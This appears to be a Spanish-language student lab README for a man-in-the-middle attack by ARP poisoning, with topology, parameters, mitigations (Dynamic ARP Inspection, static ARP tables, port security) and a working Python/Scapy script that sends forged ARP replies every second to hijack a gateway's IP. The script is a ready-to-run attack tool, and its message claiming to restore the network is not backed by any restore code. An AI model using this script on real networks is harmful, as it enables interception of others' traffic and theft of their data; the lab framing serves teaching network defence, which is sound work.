# MiM_Atack
Script de Interceptación de Tráfico (ARP Spoofing / MiTM)

/
/
https://youtu.be/udwwC3YpLC8
/
/
1. Objetivo del Script
Este script tiene como objetivo realizar un ataque de Man-in-the-Middle (MiTM) mediante la técnica de ARP Poisoning (Envenenamiento ARP). El script envía respuestas ARP falsas a una víctima (Router) para asociar la dirección IP de un nodo legítimo (Gateway o Servidor) con la dirección MAC del atacante, permitiendo interceptar el tráfico que fluye por la red.

2. Documentación Técnica de la Topología
Víctima (GW_20231243): IP 10.23.12.1 configurado como el nodo a engañar.

IP Suplantada: 10.23.12.100 (Simulación de un Gateway o Host crítico).

Atacante (Kali Linux): IP 10.23.12.43.

Topología: Red de Capa 2 plana conectada a través de un Ethernet Switch.

Direccionamiento: Configurado bajo el esquema de la matrícula 2023-1243 (Red 10.23.12.0/24).

3. Parámetros Usados
Opcode (op=2): Define el paquete como una "Respuesta ARP" (ARP Reply). Se utiliza para forzar la actualización de la tabla ARP de la víctima sin que esta haya realizado una solicitud previa (Gratuitous ARP).

Target IP (pdst): 10.23.12.1 (IP de la víctima).

Source IP (psrc): 10.23.12.100 (La identidad que el atacante desea robar).

Intervalo: Envío de paquetes cada 1 segundo para mantener el envenenamiento activo frente a actualizaciones legítimas.

4. Requisitos para utilizar la herramienta
Python 3.x y Scapy.

IP Forwarding: Para que el ataque sea exitoso y la víctima no pierda conexión, el sistema operativo del atacante debe tener habilitado el reenvío de paquetes: echo 1 > /proc/sys/net/ipv4/ip_forward

5. Medidas de Mitigación
Dynamic ARP Inspection (DAI): Configuración en switches para validar que los paquetes ARP coincidan con las asignaciones de la base de datos de DHCP Snooping.

Tablas ARP Estáticas: Mapeo manual de IP-MAC en dispositivos críticos (servidores o gateways).

Port Security: Limitar el aprendizaje de MACs en los puertos de acceso del switch.

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *

def arp_poison():
    # Configuración basada en la matrícula 2023-1243
    target_ip = "10.23.12.1"      # IP del Router Víctima
    gateway_ip = "10.23.12.100"   # IP del Gateway a suplantar
    
    print(f"Envenenando la tabla ARP de {target_ip}...")
    print(f"Haciendo creer al router que {gateway_ip} tiene nuestra dirección MAC.")
    
    # op=2: ARP Reply (Respuesta falsa enviada de forma proactiva)
    # psrc: La IP que queremos robar
    # pdst: El destino del engaño
    pkt = ARP(op=2, pdst=target_ip, psrc=gateway_ip)

    try:
        # Envío constante para evitar que la tabla ARP se corrija sola
        send(pkt, loop=1, inter=1)
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido. Restaurando red...")

if __name__ == "__main__":
    arp_poison()
